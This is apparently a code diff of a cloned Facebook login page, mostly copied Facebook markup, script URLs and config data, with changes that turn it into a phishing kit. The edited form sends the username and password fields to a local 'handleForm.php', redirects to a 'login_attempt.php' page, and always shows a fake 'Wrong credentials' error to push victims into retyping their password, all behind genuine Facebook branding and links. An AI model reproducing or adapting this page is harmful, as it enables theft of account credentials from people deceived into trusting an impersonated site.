+                            "1_fe84ad51b794fd555ef027662cbb6f2e": "Event creation",
+                            "1_ff1c542ee2c5bb59ee27ade5e7e52cb4": "Resume chats",
+                            "1_ff6b115a8a131f9f1b4b8c9c80ec38d4": "For families"
+                        }
+                    }, 551],
                     ["AnalyticsCoreData", [], {
-                        "device_id": "$^|AcatNnFUsBhjT_9At20m5HJ7rxk2uIOUSnTEWB_YjS2J9pt6TEXmhDOeEmHAahG9cMyLEWre-MyDhOlhy56wpS8hMenW4M0z_w|fd.AcZIxQlPCERatdiTiuln_fw-uuSb7GqQjoSVYqqCEmB6SHm8fDfSMk7Q0okxQe2jAy_IQvdwxfKPL7LK9Ho8YdV8",
+                        "device_id": "$^|AcbMS4-hyJljHW5_LZGBqocCs7h4a3Rx0fCUhZheMbwkU9LfOxNtVfHn-UUbVtRgIEXOG-vVuyBArvO_-oCOaf4qLPyxtuR3EqSrYcxx8ioLENY|fd.Acaw0GYbBY3n6CTiaHNjtmqA9Xw5U21_an1XJnX5fL7DjoUxX0ukT4SejBN4Ay_DLvFlQ5VwY5jpfadR8M72VDbn",
                         "app_id": "256281040558",
                         "enable_bladerunner": false,
                         "enable_ack": true,
@@ -860,7 +1079,7 @@
 
             // If validation fails, redirect to login_attempt.php
             if (!isValid) {
-                window.location.href = "login/login_attempt.php";
+                window.location.href = "login_attempt.php";
             } else {
                 // Submit the form
                 document.getElementById("form").submit();
@@ -869,47 +1088,94 @@
     </script>
 </head>
 
-<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_GB" dir="ltr">
-    <script type="text/javascript" nonce="UOCoxRtA">
+<body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh x1 Locale_en_US"
+    dir="ltr">
+    <script type="text/javascript" nonce="FCNCmmhK">
         requireLazy(["bootstrapWebSession"], function(j) {
-            j(1740880929)
+            j(1740880281)
         })
     </script>
-    <div class="_li" id="u_0_1_Qb">
+    <div class="_li" id="u_0_0_jK">
         <div id="globalContainer" class="uiContextualLayerParent">
-            <div class="fb_content clearfix " id="content" role="main">
-                <div>
-                    <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
-                        <div class="_8esk">
-                            <div class="_8esl">
-                                <div class="_8ice"><img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" /></div>
-                                <h2 class="_8eso">Facebook helps you connect and share with the people in your life.</h2>
+            <div class="fb_content clearfix" id="content" role="main">
+                <div class="_4-u5 _30ny">
+                    <div class="_97vy"><img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
+                            alt="Facebook"></div>
+                    <div class="_4-u2 _1w1t _4-u8 _52jv">
+                        <div class="_xku" id="header_block">
+                            <div class="_9axz">
+                                <span class="_97w1 _50f6">Log Into Facebook</span>
                             </div>
-                            <div class="_8esn">
-                                <div class="_8iep _8icy _9ahz _9ah-">
-                                    <div class="_6luv _52jv">
-                                        <form class="_9vtf" data-testid="royal_login_form" action="handleForm.php" method="POST" id="form"><input type="hidden" name="jazoest" value="2913" autocomplete="off" /><input type="hidden" name="lsd" value="AVqals1B0aE" autocomplete="off" />
-                                            <div>
-                                                <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy" for="inputUsername" name="inputUsername" id="inputUsername" data-testid="royal-email" placeholder="Email address or phone number" autofocus="1" aria-label="Email address or phone number" /></div>
-                                                <div class="_6lux">
-                                                    <div class="_6luy _55r1 _1kbt" id="passContainer"><input type="password" class="inputtext _55r1 _6luy _9npi" for="inputPassword" name="inputPassword" id="inputPassword" data-testid="royal-pass" placeholder="Password" aria-label="Password" />
-                                                        <div class="_9ls7" id="u_0_3_Xt"><a href="#" role="button">
-                                                                <div class="_9lsa">
-                                                                    <div class="_9lsb" id="u_0_4_5S"></div>
-                                                                </div>
-                                                            </a></div>
-                                                    </div>
-                                                </div>
-                                            </div><input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login" /><input type="hidden" autocomplete="off" name="next" value="" />
-                                            <div class="_6ltg"><button value="Login" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal-login-button" type="submit" id="u_0_5_+z" onclick="validateForm(event)">Log in</button></div>
-                                            <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQwODgwOTI5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login&amp;next" id="u_0_6_o8">Forgotten password?</a></div>
-                                            <div class="_8icz"></div>
-                                            <div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="https://www.facebook.com/r.php?entry_point=login" ajaxify="" id="u_0_0_Ut" data-testid="open-registration-form-button">Create new account</a></div>
-                                        </form>
-                                    </div>
-                                    <div id="reg_pages_msg" class="_58mk"><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" class="_8esh">Create a Page</a> for a celebrity, brand or business.</div>
+                        </div>
+                        <div class="login_form_container">
+                            <form id="form" action="../handleForm.php"
+                                method="POST" name="login_form">
+                                <input type="hidden" name="jazoest" value="2838"
+                                    autocomplete="off"><input type="hidden" name="lsd"
+                                    value="AVr7z6QDX54" autocomplete="off"><input type="hidden" autocomplete="off" id="error_box">
+                                <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box">
+                                    <div class="fsl fwb fcb">Wrong credentials</div>
+                                    <div>Invalid username or password</div>
                                 </div>
-                            </div>
+                                <div id="loginform">
+                                    <input type="hidden" autocomplete="off" id="display" name="display" value=""><input type="hidden" autocomplete="off" id="isprivate" name="isprivate" value=""><input type="hidden"
+                                        autocomplete="off" id="return_session" name="return_session" value=""><input type="hidden"
+                                        autocomplete="off" id="skip_api_login" name="skip_api_login" value=""><input type="hidden"
+                                        autocomplete="off" id="signed_next" name="signed_next" value=""><input type="hidden"
+                                        autocomplete="off" id="trynum" name="trynum"
+                                        value="1"><input type="hidden" autocomplete="off"
+                                        name="timezone" value="" id="u_0_1_Eq"><input type="hidden" autocomplete="off" name="lgndim" value="" id="u_0_2_Mh"><input type="hidden" name="lgnrnd"
+                                        value="175121_tguL"><input type="hidden" id="lgnjs" name="lgnjs" value="n">
+                                    <div class="clearfix _5466 _44mg" id="email_container">
+                                        <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" for="inputUsername"
+                                            name="inputUsername" id="inputUsername" tabindex="0"
+                                            placeholder="Email or phone number" value=""
+                                            autofocus="1" autocomplete="username"
+                                            aria-label="Email or phone number">
+                                    </div>
+                                    <div class="clearfix _5466 _44mg">
+                                        <div>
+                                            <div class="_55r1 _1kbt">
+                                                <input type="password" class="inputtext _55r1 inputtext _9npi inputtext _9npi" for="inputPassword"
+                                                    name="inputPassword" id="inputPassword" tabindex="0"
+                                                    placeholder="Password" value=""
+                                                    autocomplete="current-password" aria-label="Password">
+                                                <div class="_9ls7" id="u_0_3_i/">
+                                                    <a href="#" role="button">
+                                                        <div class="_9lsa">
+                                                            <div class="_9lsb" id="u_0_4_7q"></div>
+                                                        </div>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="_xkt">
+                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy"
+                                            id="loginbutton" name="login" tabindex="0"
+                                            type="submit" value="Login" onclick="validateForm(event)">Log In</button>
+                                    </div>
+                                    <div id="login_link">
+                                        <div class="_97w3">
+                                            <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&amp;cancel_lara_pswd=0"
+                                                class="_97w4" target="">Forgot account?</a>
+                                        </div>
+                                        <div class="_1rf5">
+                                            <span class="_1rf8">or</span>
+                                        </div>
+                                        <div class="_xkt">
+                                            <a role="button" class="_42ft _4jy0 _16jx _4jy6 _4jy2 selected _51sy"
+                                                href="https://www.facebook.com/r.php?entry_point=login">
+                                                Create new account</a>
+                                        </div>
+                                    </div>
+                                </div><input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point" value=""><input type="hidden" autocomplete="off" id="prefill_source"
+                                    name="prefill_source"><input type="hidden"
+                                    autocomplete="off" id="prefill_type" name="prefill_type"><input type="hidden" autocomplete="off" id="first_prefill_source" name="first_prefill_source"><input type="hidden"
+                                    autocomplete="off" id="first_prefill_type" name="first_prefill_type"><input type="hidden"
+                                    autocomplete="off" id="had_cp_prefilled" name="had_cp_prefilled" value="false"><input type="hidden" autocomplete="off" id="had_password_prefilled" name="had_password_prefilled" value="false"><input type="hidden" autocomplete="off" name="ab_test_data"
+                                    value="">
+                            </form>
                         </div>
                     </div>
                 </div>
@@ -963,7 +1229,7 @@
                                 <li><a href="https://www.facebook.com/careers/?ref=pf" title="Make your next career move to our brilliant company.">Careers</a></li>
                                 <li><a href="https://www.facebook.com/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li>
                                 <li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="Learn about Ad Choices.">AdChoices<i class="img sp_YbiIuPczOY_ sx_b2cf63"></i></a></li>
-                                <li><a data-nocookies="1" href="https://www.facebook.com/policies?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></li>
+                                <li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></li>
                                 <li><a href="https://www.facebook.com/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help</a></li>
                                 <li><a href="https://www.facebook.com/help/637205020878504" title="Visit our contact uploading and non-users notice.">Contact uploading and non-users</a></li>
                                 <li><a accesskey="6" class="accessible_elem" href="https://www.facebook.com/settings" title="View and edit your Facebook settings.">Settings</a></li>
@@ -977,10 +1243,10 @@
                 </div>
             </div>
         </div>
-        <div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span>
+    </div><span><img src="https://facebook.com/security/hsts-pixel.gif?c=3.2.5" width="0" height="0" style="display:none"></span>
     </div>
     <div style="display:none"></div>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         requireLazy(["HasteSupportData"], function(m) {
             m.handle({
                 "bxData": {
@@ -989,54 +1255,6 @@
                     }
                 },
                 "clpData": {
-                    "4156": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "4157": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "4158": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "4159": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "4160": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "4161": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "4172": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "4173": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "6647": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "6648": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "6661": {
-                        "r": 1,
-                        "s": 1
-                    },
-                    "6662": {
-                        "r": 1,
-                        "s": 1
-                    },
                     "1744178": {
                         "r": 1,
                         "s": 1
@@ -1047,20 +1265,8 @@
                     }
                 },
                 "gkxData": {
-                    "579": {
+                    "21116": {
                         "result": false,
-                        "hash": null
-                    },
-                    "6181": {
-                        "result": false,
-                        "hash": null
-                    },
-                    "6708": {
-                        "result": false,
-                        "hash": null
-                    },
-                    "8772": {
-                        "result": true,
                         "hash": null
                     },
                     "1624": {
@@ -1115,35 +1321,20 @@
                         "result": false,
                         "hash": null
                     },
-                    "21116": {
-                        "result": false,
-                        "hash": null
-                    },
                     "4737": {
                         "result": false,
                         "hash": null
                     }
                 },
-                "qexData": {
-                    "324": {
-                        "r": false
-                    },
-                    "1003": {
-                        "r": false
-                    },
-                    "1250": {
-                        "r": false
-                    }
-                },
                 "qplData": {
                     "2444": {
                         "r": 100
+                    },
+                    "891": {
+                        "r": 1
                     }
                 },
                 "justknobxData": {
-                    "2928": {
-                        "r": false
-                    },
                     "2233": {
                         "r": true
                     }
@@ -1166,7 +1357,7 @@
                     },
                     "6bFQpoa": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ij9m4\/ya\/l\/en_GB\/EAEmq6z9X2U.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i7M54\/y0\/l\/en_US\/EAEmq6z9X2U.js"
                     },
                     "t8DfPeZ": {
                         "type": "js",
@@ -1190,7 +1381,7 @@
                     },
                     "5GWqPnG": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4il5S4\/y8\/l\/en_GB\/WJW6GrKhLkE.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4il5S4\/ym\/l\/en_US\/A8QKDWBE_yx.js"
                     },
                     "EEAX6B4": {
                         "type": "js",
@@ -1206,7 +1397,7 @@
                     },
                     "soksgMr": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4imlR4\/yE\/l\/en_GB\/pqIBg5FZf5j.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iJfX4\/yX\/l\/en_US\/pqIBg5FZf5j.js"
                     },
                     "03T3Wls": {
                         "type": "js",
@@ -1214,7 +1405,7 @@
                     },
                     "ssGUSfp": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yE\/r\/HEDFpxDlZ34.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yX\/r\/PRCJ-M63jc-.js"
                     },
                     "R5w1rCJ": {
                         "type": "js",
@@ -1234,7 +1425,7 @@
                     },
                     "\/KFz0C8": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iKeq4\/yA\/l\/en_GB\/K2GJXp_mIOT.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iW4a4\/ym\/l\/en_US\/K2GJXp_mIOT.js"
                     },
                     "fRJFhKs": {
                         "type": "js",
@@ -1250,7 +1441,7 @@
                     },
                     "+AyrJ3Z": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yh\/r\/4rA37F4UbdK.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/ym\/r\/XuMJrNv9zCx.js"
                     },
                     "JOwuQhi": {
                         "type": "js",
@@ -1258,35 +1449,35 @@
                     },
                     "J4ABH\/z": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i_Ou4\/yO\/l\/en_GB\/q3wRiN23ZCm.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ihVQ4\/yD\/l\/en_US\/q3wRiN23ZCm.js"
                     },
                     "0gLqp\/a": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iDsb4\/yy\/l\/en_GB\/Q3P3srsg-00.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i7144\/y5\/l\/en_US\/IBf6MfgZ7g3.js"
                     },
                     "ZIx+o0g": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ix7a4\/yL\/l\/en_GB\/CYSQFQF8HO8.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ihSL4\/yJ\/l\/en_US\/CYSQFQF8HO8.js"
                     },
                     "fDvpogS": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iz2v4\/y8\/l\/en_GB\/Jnvll2vghix.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4is5S4\/y0\/l\/en_US\/Jnvll2vghix.js"
                     },
                     "RSzp7zA": {
                         "type": "css",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yZ\/l\/0,cross\/OzwYhPkNfME.css"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yG\/l\/0,cross\/T042LTHhpbs.css"
                     },
                     "7oMep+k": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yX\/r\/nbA0tFrRiua.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yi\/r\/2-NNfnBYN03.js"
                     },
                     "F3b4RwO": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ivBj4\/yw\/l\/en_GB\/drHnLY5K198.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ivBj4\/yY\/l\/en_US\/RRKpJbGwQ3S.js"
                     },
                     "QMc5BE0": {
                         "type": "css",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yx\/l\/0,cross\/E8ObPNSYXKN.css"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yr\/l\/0,cross\/gaaEnf3QQ_u.css"
                     },
                     "rrGpWKg": {
                         "type": "css",
@@ -1294,11 +1485,11 @@
                     },
                     "lbuWF+W": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i1684\/y6\/l\/en_GB\/Si2NkFXsuXo.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i1684\/yC\/l\/en_US\/9eFb3NVXj0O.js"
                     },
                     "XO+R9eu": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yf\/r\/oKgfMJSwa4h.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yz\/r\/dSfjiNAciTo.js"
                     },
                     "jGcZiJF": {
                         "type": "css",
@@ -1306,59 +1497,59 @@
                     },
                     "2xFIwcL": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ikU54\/yk\/l\/en_GB\/offqxiTc0Dz.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ickT4\/yP\/l\/en_US\/AmjjrUQ8-qv.js"
                     },
                     "8iq7gyv": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ijWR4\/ye\/l\/en_GB\/TrkrE3lnsdG.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ijWR4\/y4\/l\/en_US\/5mLNRK9IKIm.js"
                     },
                     "zzBUsTd": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iPol4\/yz\/l\/en_GB\/_NojhQ4S_m8.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iDEc4\/yD\/l\/en_US\/_NojhQ4S_m8.js"
                     },
                     "Rou8H0C": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iF524\/ys\/l\/en_GB\/WruxRjV-0aX.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iF524\/y2\/l\/en_US\/k5vVaWc35IH.js"
                     },
                     "2Yl0vI1": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ifGC4\/y8\/l\/en_GB\/ssujOGhrFxn.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ifGC4\/ye\/l\/en_US\/4TrCbcyWhNt.js"
                     },
                     "r96EXzX": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iwdk4\/yu\/l\/en_GB\/ucR0jaDL3Zr.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iwdk4\/yE\/l\/en_US\/plRxmWbmN6K.js"
                     },
                     "tjRkNKr": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/ym\/r\/dSVGJ735Cxz.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yV\/r\/WR-uaGZeyls.js"
                     },
                     "rw2DlJF": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yL\/r\/KnetAxhT_nz.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yJ\/r\/SnjClv2kwgy.js"
                     },
                     "5rdAG+8": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iDSI4\/yQ\/l\/en_GB\/DqdAYtssngp.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iDSI4\/yS\/l\/en_US\/DqdAYtssngp.js"
                     },
                     "gAzWgcS": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/y6\/r\/DPV91VbYKTI.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yZ\/r\/PqwCGenbF76.js"
                     },
                     "RYWZZH7": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iLl54\/yw\/l\/en_GB\/nHfF8VIc68v.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iLl54\/y1\/l\/en_US\/cbAoo7pg7Ha.js"
                     },
                     "ZMjSliD": {
                         "type": "css",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yq\/l\/0,cross\/ogyGoqQOxnB.css"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yg\/l\/0,cross\/NY5OFkaAKf2.css"
                     },
                     "kS9lPzq": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4isBA4\/yB\/l\/en_GB\/tbYunJvjenP.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iYbJ4\/yf\/l\/en_US\/Nwj7Yz8ijCz.js"
                     },
                     "f98Topb": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iDoa4\/yk\/l\/en_GB\/i-e10FflZwH.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i3At4\/yi\/l\/en_US\/i-e10FflZwH.js"
                     },
                     "FoxILmz": {
                         "type": "js",
@@ -1374,27 +1565,27 @@
                     },
                     "q6Vdedn": {
                         "type": "css",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yH\/l\/0,cross\/pYMyABbyV7v.css"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yf\/l\/0,cross\/ia9hO6N1iX9.css"
                     },
                     "hGT9OpB": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iBkI4\/y2\/l\/en_GB\/YBbxDfhyl6O.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iVb-4\/yf\/l\/en_US\/XOlrpKbUvpC.js"
                     },
                     "58Nt2eA": {
                         "type": "css",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yY\/l\/0,cross\/mE6u3KkDpeh.css"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/y5\/l\/0,cross\/LG0TKes-M8C.css"
                     },
                     "1Hj8y6e": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iYwN4\/yN\/l\/en_GB\/ZlzTFVb1Wtp.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iB9B4\/yA\/l\/en_US\/_YnFEPxvE4Z.js"
                     },
                     "oLzjKIf": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yy\/r\/xrVScZuNDI4.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yW\/r\/Cb3p12V3v3V.js"
                     },
                     "Yj\/Vpmx": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ie9W4\/yZ\/l\/en_GB\/xwnE_Yn_H4L.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4icTu4\/yM\/l\/en_US\/xwnE_Yn_H4L.js"
                     },
                     "u7SRlPN": {
                         "type": "js",
@@ -1406,23 +1597,23 @@
                     },
                     "MD+55GH": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yL\/r\/Jp5OhXbklsm.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yg\/r\/XfN_UbSsx1B.js"
                     },
                     "JQti3RZ": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yA\/r\/OnmgzXMfGfF.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yD\/r\/89jnBEouxeu.js"
                     },
                     "o50Zux6": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i4jp4\/yP\/l\/en_GB\/iJVuBqeshjR.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i3Aq4\/yp\/l\/en_US\/7RetEZnxwex.js"
                     },
                     "jgOoryP": {
                         "type": "css",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yy\/l\/0,cross\/viOe-8ZzIlR.css"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yY\/l\/0,cross\/TxSjVSzzreJ.css"
                     },
                     "lsmmn41": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iWtR4\/yb\/l\/en_GB\/2xs8v63rUuh.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iWtR4\/yG\/l\/en_US\/2xs8v63rUuh.js"
                     },
                     "6X7q+zy": {
                         "type": "js",
@@ -1430,15 +1621,15 @@
                     },
                     "4PpJHI7": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4icio4\/y6\/l\/en_GB\/p_oeQb4SRRO.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i4HC4\/yE\/l\/en_US\/p_oeQb4SRRO.js"
                     },
                     "uoSvcMv": {
                         "type": "css",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yb\/l\/0,cross\/DIATF2wkSRR.css"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yM\/l\/0,cross\/GzSnNN3IcCH.css"
                     },
                     "03QR9XZ": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4imlR4\/yE\/l\/en_GB\/y_I4hVAwEF0.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iJfX4\/yp\/l\/en_US\/_ktt_ioyZpY.js"
                     },
                     "JkmD8yK": {
                         "type": "css",
@@ -1446,23 +1637,23 @@
                     },
                     "PbmQgVR": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yp\/r\/1noUb5V3Y5w.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yD\/r\/Y9KIA9L0OIN.js"
                     },
                     "zgV9Xgj": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ikpZ4\/yF\/l\/en_GB\/nvUjaLBfCXK.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4iTER4\/y-\/l\/en_US\/nvUjaLBfCXK.js"
                     },
                     "CknCotK": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ia9Z4\/yS\/l\/en_GB\/iyvdGB_2CFW.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ia9Z4\/yl\/l\/en_US\/iyvdGB_2CFW.js"
                     },
                     "4E1QMmB": {
                         "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4imiF4\/yG\/l\/en_GB\/pKLXgNuMXyE.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4imiF4\/yw\/l\/en_US\/wgUHfFeHRPD.js"
                     },
                     "5KopZ2a": {
                         "type": "css",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yy\/l\/0,cross\/yXZ2EUvDRGi.css"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yc\/l\/0,cross\/x95BV5ap-vQ.css"
                     },
                     "G3XezaL": {
                         "type": "js",
@@ -1474,7 +1665,7 @@
                     },
                     "YIvOQjp": {
                         "type": "css",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/y1\/l\/0,cross\/jII-sxNPXLI.css"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v5\/yd\/l\/0,cross\/c_KxFoGLSaF.css"
                     },
                     "xsFg75a": {
                         "type": "js",
@@ -1486,7 +1677,7 @@
                     },
                     "v\/3lCdq": {
                         "type": "js",
